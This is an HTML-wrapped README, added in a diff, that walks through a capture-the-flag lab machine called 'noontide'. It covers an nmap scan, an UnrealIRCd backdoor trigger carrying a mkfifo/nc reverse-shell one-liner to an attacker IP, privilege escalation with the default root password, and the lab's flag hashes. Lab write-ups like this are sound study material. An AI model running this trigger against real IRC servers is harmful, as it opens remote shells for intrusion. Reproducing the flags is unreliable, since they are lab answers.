@@ -1,0 +1,66 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+<br/>
+IP - 192.168.206.120<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Nmap Reuslt<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/vulhub/noontide]<br/>
+└─# nmap -sC -sV 192.168.206.120 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 20:47 +0630<br/>
+Nmap scan report for 192.168.206.120<br/>
+Host is up (0.00025s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+6667/tcp open &nbsp;irc &nbsp; &nbsp; UnrealIRCd<br/>
+6697/tcp open &nbsp;irc &nbsp; &nbsp; UnrealIRCd<br/>
+8067/tcp open &nbsp;irc &nbsp; &nbsp; UnrealIRCd<br/>
+MAC Address: 08:00:27:AE:95:AE (Oracle VirtualBox virtual NIC)<br/>
+Service Info: Host: irc.foonet.com<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse shell<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc 192.168.206.120 6667 -vn<br/>
+(UNKNOWN) [10.0.2.11] 6667 (ircd) open<br/>
+:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...<br/>
+:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br/>
+AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.45.5 4444 &gt;/tmp/f<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+server@noontide:~$ cat local.txt<br/>
+da8d783c06bb884dbdb0ca08a7834e75<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation<br/>
+<br/>
+Simply change root into with password root. Before swith user into root, I tried run linpeas.sh for priv escalation enum and waste of time a little bit. I remember "This machine is difficult... NOT!"<br/>
+then I decided to run root with password root. Boom! got root -___-<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+Final Flag.<br/>
+root@noontide:~# cat proof.txt <br/>
+0e72845832dbef841ae5659b0283300b<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
